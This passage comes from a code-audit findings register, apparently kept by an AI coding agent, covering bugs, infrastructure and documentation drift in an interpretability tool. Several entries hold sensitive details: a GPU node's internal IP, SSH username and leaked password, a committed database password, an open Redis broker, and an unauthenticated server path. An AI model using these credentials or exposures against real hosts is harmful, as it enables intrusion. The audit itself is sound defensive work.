  3. **The `[settings]` sync effect rewrites all five Labeling fields on every upsert**, so saving one card silently reverts unsaved edits in another.
- **Failure scenario:** (1) is the sharpest — a delete control that appears to remove an endpoint and actually removes the labeling model, with no confirmation. (3) loses user input with no error. This panel holds the product's credentials and is untested (MIS-E2E-016 — `SettingsPanel.tsx` is 1,368 lines with no test file).
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-14, IDL-20
- **Verification (R3):** pending
- **Proposed remediation:** Filter the endpoints list by key rather than category; await and catch the mutations (the tested `utils/fireAndForget.ts` helper exists and is unused here — MIS-E2E-021); make the sync effect skip fields the user has touched.
- **Effort:** M

---

### MIS-E2E-131 — Three Circuits panel defects: a dead poll, a hidden stale id, and a silent export
- **Phase / Round:** P08 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `frontend/src/components/panels/CircuitsPanel.tsx:740`, `:1322`, `:1333`, `:568`
- **Claim:**
  1. **`mountedRef` is set `false` on cleanup and never back to `true`** (`:740`). With StrictMode on (`main.tsx:7`), the CaptureTab estimate poll is **dead on arrival in dev**, so the "Cost estimate" / "Run capture" card never appears — a developer-visible break of the panel's entry point.
  2. **Un-ticking "Force" removes the stale capture from the options but leaves `captureId` set** (`:1322`). The select shows no selection while "Run discovery" submits the hidden stale id and is refused — the user sees a rejection for a choice the UI says they did not make.
  3. **`parseSeedRefs` validates only `layer`** (`:1333`); a line like `6` yields `feature_idx: NaN`, serialised as `null` in the POST body.
  4. **Slice export clicks a detached anchor and revokes the object URL on the next line** (`:568`) — a silent no-op in Firefox. The five other download sites in this repo all append to `document.body` first.
- **Failure scenario:** (1) and (4) are silent no-ops — a feature that appears absent and a button that does nothing. (2) produces a refusal the user cannot explain from what is on screen.
- **Evidence:** plausible (read-only)
- **Doc reference:** PADR IDL-32, IDL-33
- **Verification (R3):** pending — all four are browser-observable
- **Proposed remediation:** Set `mountedRef.current = true` on mount; clear `captureId` when its option disappears; validate `feature_idx`; append the anchor and revoke after the click.
- **Effort:** M

---

## Out-of-band — Feature Detail modal (user-reported, 2026-08-23)

Four defects the user found in the running product while the audit was between
phases. Recorded here so the register stays the complete account. **These four
were fixed immediately at the user's request** — the only departure from the
audit's strict record-only rule, made deliberately and noted in the round records.

---

### MIS-E2E-132 — Ablation refuses every feature in the product, blaming the feature
- **Phase / Round:** out-of-band / user-reported
- **Source:** live product; confirmed at source
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/services/analysis_service.py` `calculate_ablation`; `backend/src/api/v1/endpoints/features.py:684`
- **Claim:** `calculate_ablation` loaded the feature successfully, then did `training = await self._get_training(feature.training_id)` and returned `None` when that failed. **`training` was never used again** — the estimate is computed entirely from `FeatureActivation` rows and `feature.activation_frequency`. It was a dead precondition. The endpoint maps `None` to `404 "Feature {id} not found"`, so the message was wrong twice: the feature *was* found, and the actual failure was a training lookup.
- **Failure scenario:** `Feature.training_id` is NULL for **every feature in this deployment** — all 20 extractions have it NULL. Features are extracted against an SAE in the registry, so the link is `Feature.external_sae_id → ExternalSAE.training_id`. The Ablation tab therefore 404'd for every feature, and the message sent the reader looking for a missing feature that was right there.
- **Evidence:** **verified-by-live-repro** — `GET /features/feat_sae_20260726_174056_d1a4_00000/ablation` → 404 with that message, while `GET /features/{id}` → 200; reproduced on a second, never-analysed feature
- **FIXED:** the dead lookup is removed, with a comment recording why it was wrong.
- **Effort:** S

---

### MIS-E2E-133 — Correlations were computed against features from other models
- **Phase / Round:** out-of-band / user-reported
- **Source:** live product; found while diagnosing the 500
- **Severity:** P1
- **Type:** bug *(the "wrong results presented as correct" class)*
- **Location:** `backend/src/services/analysis_service.py`, `calculate_correlations` peer query
- **Claim:** Peers were selected with `Feature.training_id == feature.training_id`. Since `training_id` is NULL for every feature, SQLAlchemy compiles that to **`training_id IS NULL`**, which matches **every feature of every SAE in the deployment** — 32,766 in this one SAE alone, across 20 unrelated SAEs and models, capped only by the 2,000-row sample.
- **Failure scenario:** Confirmed on the live app: correlations for a feature in `extr_20260223_190441` returned `feat_sae_20260223_131023_01636` — **a different extraction, a different SAE**. "Correlated features" were drawn from other dictionaries entirely and then frozen for seven days by the cache. Nothing indicated it; the numbers looked ordinary.
- **Evidence:** **verified-by-live-repro** — the cross-SAE peer id in the live response
- **FIXED:** peers are now scoped to the same dictionary (`external_sae_id`, falling back to `training_id`), and a feature with neither is logged and returns no peers rather than silently comparing against the whole table.
- **Effort:** S
- **Note:** this is the same root shape as MIS-E2E-100 and the recorded memory `cluster-profile-persisted-shape` — *derive it from the `ExternalSAE` row*. Third consumer found with the same assumption.

---

### MIS-E2E-134 — Token Analysis showed raw BPE markers
- **Phase / Round:** out-of-band / user-reported
- **Source:** live product
- **Severity:** P3
- **Type:** bug
- **Location:** `frontend/src/components/features/FeatureTokenAnalysis.tsx:243`
- **Claim:** The ranked-token table rendered `{tokenData.token}` raw, so every common word appeared as `Ġthe`, `Ġa`, `Ġand`. `Ġ` (U+0120) is the GPT-2/Llama byte-level BPE marker meaning *"preceded by a space"* — it is not a character in the text. `cleanToken` already existed in `utils/tokenUtils.ts` and was used elsewhere; this table used neither it nor the backend's `normalize_token`.
- **Failure scenario:** Cosmetic but pervasive — the top of the token table is exactly where common words rank, so nearly every visible row was affected.
- **FIXED:** the marker is stripped for display, the raw form is kept in a tooltip, and — because the distinction is real information about what the feature fires on (`Ġthe` is the word *"the"*; `the` is the tail of *"breathe"*) — continuation tokens now carry a `⋯` prefix rather than being silently conflated with word-initial ones.
- **Effort:** S

---

### MIS-E2E-135 — `Feature.training_id` is NULL by design and three consumers assume it is not
- **Phase / Round:** out-of-band / user-reported
- **Source:** synthesis of 132, 133 and MIS-E2E-100
- **Severity:** P1
- **Type:** debt
- **Location:** the `Feature → ExternalSAE → Training` chain, versus consumers reading `Feature.training_id` directly
- **Claim:** `external_saes` is the **SAE registry**, not a table of foreign SAEs. A locally-trained SAE is exported to `community_format/`, imported into the registry (`source="trained"`, carrying `training_id` and `model_id`), and feature extraction runs against the **registry SAE**. So `Feature.training_id` is NULL and the provenance is one hop away. Verified on the live app:
  ```
  Feature.external_sae_id  = sae_d1a486a712b0
      ExternalSAE.source      = "trained"
      ExternalSAE.training_id = train_969e90af
      ExternalSAE.model_id    = m_8a9fe2c7
  ```
  Nothing is lost — but three consumers read `Feature.training_id` directly and break: ablation (MIS-E2E-132), correlations (MIS-E2E-133) and the Steering feature browser (MIS-E2E-100).
- **Failure scenario:** The three symptoms differ — a 404, silently wrong peers, missing labels and `activation_frequency` — which is why they were never connected. The `Feature` model already has the right abstraction: `source_id`, returning `external_sae_id or training_id`. It is used by none of them.
- **Evidence:** **verified-by-live-repro** — the SAE row queried on the live app; all 20 extractions confirmed `training_id: None`
- **Verification (R3):** CONFIRMED
- **Proposed remediation:** A single resolver — "give me the training/model behind this feature" — that walks the SAE row, and a sweep of every direct `Feature.training_id` read. MIS-E2E-100 is still open and is the third instance.
- **Effort:** M

---

## P09 — Realtime (WebSocket end to end)

---

### MIS-E2E-136 — Sync WebSocket emits POST to the API's own event loop and can freeze it
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/workers/websocket_emitter.py:106`; callers `api/v1/endpoints/models.py:630,1031,1133`, `api/v1/endpoints/datasets.py:1279,1289`, `services/extraction_service.py:845`
- **Claim:** `emit_progress` is **synchronous** and issues an HTTP POST to `/api/internal/ws/emit` — the backend's *own* endpoint. When it is called from inside an `async def` handler, the coroutine blocks the single event loop while waiting for a response that only that same loop can produce. Reproduced by the reviewer with a minimal uvicorn app: `ReadTimeout` after 5.01 s, the event dropped, and the whole API frozen for the duration. `datasets.py` calls it twice in sequence, so ~10 s.
- **Failure scenario:** Self-deadlock under a single worker. Every other request — including WebSocket emissions and training dispatch — stalls for the timeout, and the progress event that caused it is lost anyway.
- **The fix exists and was not generalized.** `training_service.py:328` wraps the same call: `await asyncio.to_thread(emit_deletion_progress, …)`, under a comment reading *"Run emit_deletion_progress in thread pool to avoid blocking async loop."* The author understood the hazard at that one site. Counted across the three exposed files: **13 sync `emit_*` calls, zero `to_thread`.**
- **Evidence:** **verified-by-live-repro** — the reviewer reproduced the deadlock against a minimal uvicorn app; the defended site and the 13 undefended calls counted directly
- **Doc reference:** PADR IDL-12; the architect persona already records *"In-process HTTP loopback: BackgroundMonitor runs inside FastAPI yet POSTs to its own `/api/internal/ws/emit`"*
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** From async contexts call `ws_manager.emit_event()` **directly** rather than looping back over HTTP — the recorded architectural recommendation. `asyncio.to_thread` is the stopgap the one fixed site already uses.
- **Effort:** M
- **Note:** the fourth "fixed one representative, never generalized" instance in this audit (MIS-E2E-064, 072, 092, this).

---

### MIS-E2E-137 — The retry that guarantees delivery catches the wrong exception
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `backend/src/workers/websocket_emitter.py:128` (`except httpx.TimeoutException`) versus `:138` (`except Exception` → `return False`)
- **Claim:** The retry loop retries **only** `httpx.TimeoutException`. Verified against the installed httpx:
  ```
  ConnectError          is TimeoutException? False
  RemoteProtocolError   is TimeoutException? False
  ReadTimeout           is TimeoutException? True
  ```
  `ConnectError` and `RemoteProtocolError` fall through to the generic handler, which logs and returns `False` **immediately** — so `retries=3` yields zero retries for them.
- **Failure scenario:** `RemoteProtocolError` is precisely what a **stale pooled connection** produces after a backend restart — the single scenario the retries exist for. The events configured with `retries=3` are the ones the code treats as must-not-lose: `steering:completed`, `neuronpedia:push_completed`, `enhanced_labeling:completed`. A terminal event silently dropped leaves the UI showing a job in progress forever, which is the failure mode this product has been bitten by repeatedly.
- **Evidence:** **verified-by-live-repro** — the exception hierarchy checked against the installed httpx; both handlers read
- **Doc reference:** PADR IDL-12
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Retry on `httpx.TransportError` (the parent of both timeout and connection failures), keeping the immediate return only for genuine HTTP error statuses.
- **Effort:** S

---

### MIS-E2E-138 — Duplicate Socket.IO handlers silently disable the acks and strip the exported manager
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/core/websocket.py:281` versus `backend/src/main.py:93-118`
- **Claim:** Both modules register `@sio.event` handlers for the same events. Verified against live `python-socketio` 5.16.2: a later registration **silently overwrites** the earlier one. `main.py` wins, so `core/websocket.py`'s handlers never run — the `subscribed` / `unsubscribed` acknowledgements never fire, and the `__all__`-exported `ws_manager` singleton is never populated.
- **Failure scenario:** Any consumer importing `ws_manager` to inspect subscriptions sees a permanently empty registry — including the direct-emit path MIS-E2E-136 recommends. And the client-side ack the frontend's `WebSocketContext` listens for (`'subscribed'`, `'unsubscribed'`) never arrives, so its queueing logic can never confirm a subscription landed.
- **Evidence:** **verified-by-live-repro** (reviewer confirmed the overwrite behaviour against the installed library)
- **Doc reference:** PADR IDL-1, IDL-12
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Register once. Given MIS-E2E-105 also needs `subscribe` hardened, do both in the surviving handler.
- **Effort:** S

---

### MIS-E2E-139 — The system monitor can die silently and permanently
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `backend/src/services/background_monitor.py:83` (`start`), `:61` (`stop`)
- **Claim:** A crash during `_monitor_loop` setup leaves `_running = True`. `start()` then refuses to restart ("already running") and **nothing is logged**, so every `system/*` channel — CPU, memory, disk, network, per-GPU — goes permanently silent. Separately, `stop()` catches only `CancelledError`, so a dead loop's exception re-raises out of the FastAPI lifespan shutdown and `_http_client` is never closed.
- **Failure scenario:** The Monitor page freezes with no error. This is the same shape as the recorded P0 where system-metrics emission 403'd silently — the frontend fallback keys on *connection*, not data freshness, so a live socket delivering nothing looks healthy.
- **Evidence:** verified-by-live-repro (reviewer mirrored the start/stop logic faithfully and reproduced the state)
- **Doc reference:** PADR IDL-5; `.claude/context/sessions/review_celery_monitor_operations_2026-07-10.md`
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Reset `_running` in a `finally`; log the setup failure; broaden `stop()`'s handler.
- **Effort:** S

---

### MIS-E2E-140 — `subscribe` accepts any type and any quantity of channels
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** security
- **Location:** `backend/src/core/websocket.py:107`
- **Claim:** The client-supplied `channel` is neither type-checked nor bounded. A list raises `TypeError: unhashable type`; a non-dict payload raises `AttributeError`. The reviewer created **50,000 channels** from an unauthenticated client in a test.
- **Failure scenario:** Compounds MIS-E2E-105 (any origin, no auth, any channel name): the same connection can also exhaust the subscription registry or crash the handler with a malformed payload. Recorded as a distinct finding because fixing 105's origin check does not add validation, and vice versa.
- **Evidence:** **verified-by-live-repro** (reviewer exercised both the type errors and the unbounded growth)
- **Doc reference:** PADR IDL-1
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Validate the payload shape and the channel against a known pattern; cap subscriptions per connection.
- **Effort:** S

---

### MIS-E2E-141 — Two emitter defects: a wrong event name and an unlocked, never-closed client
- **Phase / Round:** P09 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** bug
- **Location:** `backend/src/workers/websocket_emitter.py:838` (`emit_system_metrics`), `:43` (`_get_http_client`)
- **Claim:**
  1. `emit_system_metrics` emits the event name `"metrics"` while every sibling emitter and the whole frontend use `"system:metrics"`. It has no callers today, so it delivers nothing to nobody — **and returns `True`**.
  2. `_get_http_client()`'s lazy initialisation has no lock (a race under any non-default `CELERY_POOL`) and the client is never closed at shutdown.
- **Failure scenario:** (1) is a latent trap: the first caller to use it will get a silent no-op with a success return. (2) leaks a connection pool per worker process.
- **Evidence:** verified-by-live-repro (the name mismatch and the absent lock read directly)
- **Doc reference:** PADR IDL-12 (WebSocket Emission Standardization) — the IDL this violates
- **Verification (R3):** CONFIRMED at R1
- **Proposed remediation:** Rename the event; guard the lazy init and close the client in the lifespan.
- **Effort:** S

---

## P09 — R2 (mutation controls)

---

### MIS-E2E-142 — Nothing pins which emit failures are retried
- **Phase / Round:** P09 / R2
- **Source:** mutation control M26
- **Severity:** P2
- **Type:** test-gap
- **Location:** `backend/src/workers/websocket_emitter.py:128`
- **Claim:** Changing the retry handler from `except httpx.TimeoutException` to `except httpx.TransportError` — which flips a `ConnectError`/`RemoteProtocolError` from *abandoned immediately* to *retried three times with backoff* — left the suite green. No test asserts which failures are retried, in either direction.
- **Failure scenario:** The narrow catch of MIS-E2E-137 is therefore not a pinned decision but unobserved behaviour, and a fix to it would be equally unobserved. The events configured `retries=3` are the terminal ones — `steering:completed`, `neuronpedia:push_completed`, `enhanced_labeling:completed` — where a silent drop leaves the UI showing a finished job as still running.
- **Evidence:** **verified-by-mutation** — M26 landed, suite green, restore confirmed
- **Doc reference:** PADR IDL-12
- **Verification (R3):** CONFIRMED at R2
- **Proposed remediation:** Two tests: a `ReadTimeout` retries and eventually succeeds; a `RemoteProtocolError` does the same. Fix MIS-E2E-137 and use these as its negative control.
- **Effort:** S
- **Method note:** this mutation applied the *fix* rather than breaking the code. Where a finding claims behaviour is wrong, checking that the corrected behaviour is also unobserved tells you whether the fix will stay fixed.

---

## P10 — Infra & supply chain

---

### MIS-E2E-143 — The public mirror publishes everything the filter exists to withhold, including an SSH password
- **Phase / Round:** P10 / R1
- **Source:** /code-review high; confirmed against the live public repository
- **Severity:** **P0 — ACT NOW**
- **Type:** security
- **Location:** `.github/workflows/sync-to-clean.yml:27-78`; `scripts/k8s-helpers.sh:7`
- **Claim:** `sync-to-clean.yml` checks out with `fetch-depth: 0`, `rm -rf`s the excluded paths, commits **one filter commit**, and then `git push --force` to `hitsainet/miStudio`. That publishes the **entire unfiltered history** with a single cleanup commit on top. The filter therefore removes the files from the **tip** and from nowhere else — every excluded path is readable one commit back.
- **Verified against the live public repository** (`hitsainet/miStudio`, `"visibility": "public"`, `"private": false`), comparing the tip against its parent `ef270db`:
  ```
  path                                      tip      history
  scripts/k8s-helpers.sh                    404      PRESENT   ← contains K8S_PASS=
  backups/mistudio_db_20251218_035811.sql.gz 404     PRESENT   ← database dump
  CLAUDE.md                                 404      PRESENT
  0xcc/audits/E2E-2026-08/FINDINGS.md       404      PRESENT   ← this audit
  scripts/backup-db.sh                      404      PRESENT
  ```
- **Failure scenario — three distinct exposures, all live:**
  1. **`scripts/k8s-helpers.sh:7` hardcodes `K8S_PASS` — the SSH password for the GPU node** (`192.168.244.61`, user `sean`), used with `StrictHostKeyChecking=no`. It is published and world-readable. **This credential must be treated as compromised and rotated.**
  2. **Five database dumps** (`backups/*.sql.gz`) are published. This supersedes MIS-E2E-008, which recorded them as *"stripped from the public mirror, but in this repo's history"* — they are in the **public** repo's history. Their contents determine whether encrypted API-key envelopes and user prompt text are also exposed.
  3. **This audit's own `FINDINGS.md` is published**, and it is a complete, indexed inventory of 142 unremediated defects including 11 P0 security holes with reproduction steps. It reached the public repo through the merge that deployed the Feature Detail fixes.
- **Why the filter looked correct:** it does exactly what its comments say — the exclusion list is right, the intent is right, and `docs/schemas/` and `mcp-contract.md` are correctly preserved. Nothing about reading the workflow reveals the problem, because the defect is not in *what* it removes but in the fact that `--force`-pushing a full history makes removal-at-the-tip meaningless. `docker-images.yml` even documents the mechanism in passing — *"HEAD~1 is the unfiltered source tip"* — as a build-detection nuance, not as a disclosure.
- **Evidence:** **verified-by-live-repro against the public GitHub API** — repository visibility, tip 404s, and parent-commit presence for five paths
- **Doc reference:** `.github/workflows/sync-to-clean.yml`; supersedes MIS-E2E-007 and MIS-E2E-008 in severity and scope
- **Verification (R3):** **CONFIRMED**
- **Proposed remediation, in order:**
  1. **Rotate the GPU node's SSH password now**, and move `k8s-helpers.sh` to key-based auth reading from the environment. Assume the current value is known.
  2. **Make the mirror private** until the history is dealt with — one setting, immediate, reversible.
  3. **Rewrite the mirror's history**: publish a squashed single commit, or filter with `git filter-repo` before pushing. A force-push of full history can never be filtered by deleting files at the tip.
  4. Review the dumps for credential and prompt content; rotate anything they hold.
  5. Add a CI check that greps the *published* tree's history for the exclusion list and fails the sync.
- **Effort:** M (S for steps 1–2, which stop the bleeding)
- **FIXED 2026-08-23 (mechanism), user action outstanding (rotation):**
  - `sync-to-clean.yml` now builds an **orphan commit** (`git checkout --orphan`) and
    pushes that. The published repo contains exactly one commit and no parents, so
    there is no history to leak — excluded **by construction**, not by policy. Checkout
    is `fetch-depth: 1`: a snapshot needs no history, and fetching one is what made the
    old failure possible.
  - **A second leak path was found and closed during the fix.** The first draft kept the
    old tag-forwarding step. `git push <remote> <source-tag>` pushes the objects needed
    to complete the tag — the source commit **and all its ancestors** — which would have
    reintroduced the entire history through the tag. Proved locally: pushing a source tag
    to a single-commit mirror took it from 1 commit to 2, the second being the commit the
    snapshot had just dropped. Tags now point at the **orphan** (`git tag -f "$TAG" HEAD`).
  - A **Verify** step clones the published mirror and asserts (a) exactly one commit and
    (b) no excluded path in **any** commit — `git log --all -- <path>`, which finds a path
    in any tree, reachable or not. It also asserts `docs/schemas` and `docs/mcp-contract.md`
    **are** present, since mirror tests and external consumers depend on them.
  - **The gate was tested against a violation before being trusted.** A mirror was built
    the old way (full history + filter commit) and the same gate run against it: it failed,
    naming `0xcc`, `CLAUDE.md` and `scripts`. A guard never seen to fail is not a guard —
    four source-scrape guards in this audit failed open.
  - `scripts/k8s-helpers.sh` no longer contains a credential: key-based auth
    (`ssh -o BatchMode=yes`), host and user from the environment, and
    `StrictHostKeyChecking=no` removed — it accepted any host key, so the connection was
    unauthenticated in both directions. Sibling sweep found no other committed credential
    and no other `sshpass` user.
  - **STILL REQUIRED — user action:** rotate the GPU node's SSH password. Per the locked
    decision the already-published objects are being left in place, so **rotation is the
    only mitigation** for that half. The published literal is `pass`.
  - **Accepted residual risk:** the previously-published objects remain retrievable by SHA
    (GitHub serves unreachable commits). That includes the 135-finding snapshot of this
    register. Future syncs publish none of it.

---

### MIS-E2E-144 — `k8s_deploy` re-applies a stale manifest and reverts two shipped fixes
- **Phase / Round:** P10 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `k8s/mistudio-deployment.yaml:220` versus `k8s/base/backend.yaml`; `scripts/k8s-helpers.sh:60`
- **Claim:** ArgoCD deploys `k8s/base` (via kustomize). The root `k8s/mistudio-deployment.yaml` is a second, **stale** copy: it is missing `celery-worker-cpu`, `CELERY_QUEUES`, `CELERY_WORKER_NAME` and `ENVIRONMENT=production`. `k8s_deploy` — documented as break-glass — re-applies that file, which **reverts the queue-split fix and the SQL-echo incident fix** on a cluster that currently has them. The guard test reads only `k8s/base`, so it cannot see the divergence.
- **Failure scenario:** The emergency procedure silently undoes two incident fixes, at the moment it is most likely to be used. Compounding: `k8s_deploy` never restarts `mistudio-mcp`, which runs the same backend image, so new MCP tools stay invisible after a break-glass deploy.
- **Evidence:** verified-by-live-repro (both manifests diffed; the guard's path scope read)
- **Doc reference:** `CLAUDE.md` K8s Helper Commands; memory `mistudio-gitops-cicd`
- **Verification (R3):** pending
- **Proposed remediation:** Delete the root manifest and have `k8s_deploy` apply `k8s/base` via kustomize, so there is one source of truth. Extend the guard to fail if a second manifest defines the same Deployments.
- **Effort:** S

---

### MIS-E2E-145 — Postgres and Redis run as RollingUpdate Deployments over hostPath
- **Phase / Round:** P10 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** bug
- **Location:** `k8s/base/postgres.yaml:10` (and the redis manifest)
- **Claim:** Both are `Deployment`s with the default `RollingUpdate` strategy backed by `hostPath` volumes. A rollout therefore starts the new pod **before** terminating the old one, and both mount the same data directory. Postgres wedges on `postmaster.pid`; Redis clobbers `dump.rdb`. The backend Deployment already uses `Recreate` — the pattern is known and was applied to the stateless component, not the stateful ones.
- **Failure scenario:** Any change to either manifest — an image bump, a resource tweak, a config change — risks corrupting the database on a shared data directory. It has not fired only because these manifests rarely change.
- **Evidence:** plausible (read-only) — the strategy and volume type read from the manifests
- **Doc reference:** PADR deployment standards
- **Verification (R3):** pending
- **Proposed remediation:** `strategy: Recreate` on both, or move to StatefulSets with real PVCs.
- **Effort:** S

---

### MIS-E2E-146 — Compose publishes an unauthenticated Redis and a known-password Postgres on all interfaces
- **Phase / Round:** P10 / R1
- **Source:** /code-review high
- **Severity:** P1
- **Type:** security
- **Location:** `docker-compose.yml:25` (postgres `5432:5432`, `devpassword`), `:61` (redis `6379:6379`, no auth)
- **Claim:** Both are published on `0.0.0.0`. The Redis instance is the **Celery broker**, so anyone on the LAN can enqueue tasks — which in this product means starting GPU jobs, and reaching the task payloads of jobs already queued.
- **Failure scenario:** Broader than the accepted no-app-auth posture (MIS-E2E-002): that posture concedes the *API*, behind nginx. This is the broker and the database, direct, bypassing nginx entirely. A LAN attacker enqueues a Celery task or reads the database with a password committed to the repo.
- **Evidence:** verified-by-live-repro (port bindings read; `mistudio-postgres` is currently listening on `0.0.0.0:5432` on this host)
- **Doc reference:** MIS-E2E-002
- **Verification (R3):** pending
- **Proposed remediation:** Bind to `127.0.0.1:` in the published ports, and set a Redis password.
- **Effort:** S

---

### MIS-E2E-147 — Five infra defects that make a deployment or a diagnosis wrong
- **Phase / Round:** P10 / R1
- **Source:** /code-review high
- **Severity:** P2
- **Type:** bug
- **Location:** `docker-compose.yml:269`, `:188`; `nginx/nginx.docker.conf:32`; `scripts/k8s-helpers.sh:69`; `nginx/nginx.conf:46`
- **Claim:**
  1. **The compose frontend is unreachable.** Published `3000:80`, but commit `bca37c6` moved the image to nginx-unprivileged on **8080** and updated only k8s and `nginx.docker.conf`. `http://localhost:3000` is dead.
  2. **`k8s_deploy` reports success on failure.** The whole `&&` chain ends in one `|| echo "Schema verification failed"`, so a failed pull, apply or rollout is misreported and the function returns 0.
  3. **No `/ollama/` location in `nginx.docker.conf`.** The labeling default `/ollama/v1` hits the SPA catch-all and returns `index.html` with a **200** — surfacing as "no models found" rather than a routing error.
  4. **The compose worker consumes every queue on one solo slot** — the exact head-of-line-blocking incident the k8s deployment fixed by adding a second worker.
  5. **`nginx.conf:46` `server_name` typo** — `192.168.224.222` where the CORS map says `.244.`. Works only because it is the default server block.
- **Failure scenario:** (2) is the sharpest: the break-glass deploy path reports success when it failed, and (1) means the documented dev URL has been broken since `bca37c6`.
- **Evidence:** verified-by-live-repro (each read at source; the port change traced to its commit)
- **Verification (R3):** pending
- **Proposed remediation:** Individually small; (2) first.
- **Effort:** M

---

### MIS-E2E-148 — Two guards that fail open, and a keyring that trusts too much
- **Phase / Round:** P10 / R1
- **Source:** /code-review high
- **Severity:** P3
- **Type:** debt
- **Location:** `backend/tests/unit/test_worker_queue_coverage.py:40`; `k8s/base/ingress.yaml:36`; `backend/Dockerfile:24`
- **Claim:**
  1. The manifest guard `pytest.skip`s if the manifest path moves — **fails open**, the fourth source-scrape guard in this audit to do so.
  2. `ingress.yaml:36`'s `/api` prefix exposes `/api/internal/*`, which **both** nginx configs deny as security-critical. Mitigated by the HMAC check on those two endpoints (verified correct in P05), so the defence-in-depth layer is missing rather than the defence.
  3. `backend/Dockerfile:24` uses `apt-key adv`, putting the deadsnakes key in the **global** trusted keyring — trusted for all repositories. `signed-by=` scopes it.
- **Evidence:** verified-by-live-repro
- **Verification (R3):** pending
- **Effort:** S

---

## P11 — Documentation chain conformance

---

### MIS-E2E-149 — The sentence that cost a real SAE is still live in the second manual
- **Phase / Round:** P11 / R1
- **Severity:** **P1** *(safety — this exact wording has already destroyed a training run)*
- **Type:** doc-drift
- **Location:** `docs/miStudio_Manual.md:349`
- **Claim:** `- **Stop:** Gracefully end training (saves final checkpoint)`
- **Reality:** `trainings.py:247-251` — `action == "stop"` calls `stop_training` and `revoke_task(terminate=True)` and nothing else. Only `stop_and_finalize` (`:252-274`) dispatches `finalize_training_from_checkpoint_task`, which writes `community_format/` — the only artifact downstream reads.
- **Why it matters:** this is not *comparable* to the recorded incident, it is **the identical sentence**. `CLAUDE.md` records that this line in `manual/docs/core-workflow/sae-training.md` *"was factually wrong and is what cost a real run"* — `train_969e90af`, granite-4.1-8b, FVU 0.065, zero dead neurons, stopped at step 10,300, SAE forfeited. That page **was** fixed: `:183` now carries `:::warning Stop does not save an importable SAE`. `docs/miStudio_Manual.md` was not. It is a 599-line standalone "Complete User Manual", last substantively edited 2026-04-08, and it is indexed in `.understand-anything/knowledge-graph.json`, so an agent querying the repo's own knowledge graph can be served the uncorrected text.
- **Evidence:** **verified-by-live-repro** — both manuals and the endpoint read; the corrected warning and the uncorrected sentence quoted above
- **Verification (R3):** **CONFIRMED**
- **Proposed remediation:** Fix the line. Then decide whether `docs/miStudio_Manual.md` should exist at all — it predates MCP, clusters, circuits and J-Lens (zero hits for any of them). A second, stale manual is a second place for every future correction to miss.
- **Effort:** S

---

### MIS-E2E-150 — The manual's fix for a startup refusal removes authentication from a LAN-bound server
- **Phase / Round:** P11 / R1
- **Severity:** **P1**
- **Type:** security
- **Location:** `manual/docs/advanced/mcp-server.md:37`, `:64`, `:140`; `backend/src/mcp_server/server.py:102`
- **Claim:** The page states the server binds `0.0.0.0:8765` with a **"bearer token always required"**, and `MCP_AUTH_TOKEN` is *(required)* — startup refused if empty. Its troubleshooting remedy at `:140` is: *"Set the token in `.env` (or `MCP_ALLOW_ANONYMOUS=true` for stdio dev only)"*.
- **Reality:** `MCP_ALLOW_ANONYMOUS` is **not** stdio-restricted. `server.py:102` reads `if not settings.auth_token and not (settings.allow_anonymous or stdio)` — the flag **alone** satisfies the guard on the HTTP transport. `__main__.py:36-40` then adds `BearerAuthMiddleware` only when a token is set, otherwise logs a warning and serves on `settings.host`, default `0.0.0.0`.
- **Why it matters:** an operator hitting the startup error follows the documented remedy and gets a LAN-reachable **unauthenticated** MCP server exposing `delete_circuit`, GPU steering and label write-back — on the same page that told them a bearer token is always required. **And the guard's own error message repeats the false claim**: *"Set a token, or set MCP_ALLOW_ANONYMOUS=true for local stdio development only."* The code says "stdio only" in prose and does not enforce it.
- **Evidence:** **verified-by-live-repro** — the guard, the middleware branch, and both strings read directly
- **Verification (R3):** **CONFIRMED**
- **Proposed remediation:** Make the flag actually stdio-only (`allow_anonymous and stdio`), which is what both the manual and the error message already promise.
- **Effort:** S

---

### MIS-E2E-151 — Dataset cancel is documented as conservative and deletes unrelated tokenizations
- **Phase / Round:** P11 / R1
- **Severity:** **P1** *(data loss)*
- **Type:** bug
- **Location:** `manual/docs/core-workflow/dataset-management.md:21`, `:37`; `backend/src/workers/dataset_tasks.py:1357-1367`; `backend/src/api/v1/endpoints/datasets.py:710-712`
- **Claim:** The manual says cancelling during post-download processing *"keeps the raw files so you can retry without re-downloading"*, and that each tokenization *"can be cancelled or deleted **independently**"*.
- **Reality:** the cancel worker iterates **all** `dataset.tokenizations` and `shutil.rmtree`s every `tokenized_path`, ungated by status and ungated by which job is being cancelled — while the raw-file cleanup immediately above it (`:1348`) *is* status-gated. DB rows survive, so previously-COMPLETED tokenizations still render in the UI pointing at deleted directories. Separately `datasets.py:710-712` carries `# Note: We don't have task_id stored, so we can't revoke the specific task` and calls `cancel_task` with no `task_id`, so the revoke branch is dead and the worker keeps running.
- **Why it matters:** the same shape as the SAE-forfeit incident — an operation the manual describes as conservative destroys an unrelated artifact. The per-tokenization cancel path *is* correctly scoped, which is exactly what makes the "independently" claim misleading.
- **Evidence:** verified-by-live-repro (all three sites read)
- **Verification (R3):** **CONFIRMED**
- **Effort:** M

---

### MIS-E2E-152 — The K8s install guide's `sed` steps match nothing, and one renames the database
- **Phase / Round:** P11 / R1
- **Severity:** P1
- **Type:** doc-drift
- **Location:** `manual/docs/getting-started/install-guide-k8s.md:234-257`; same prose at `installation.md:147-175`
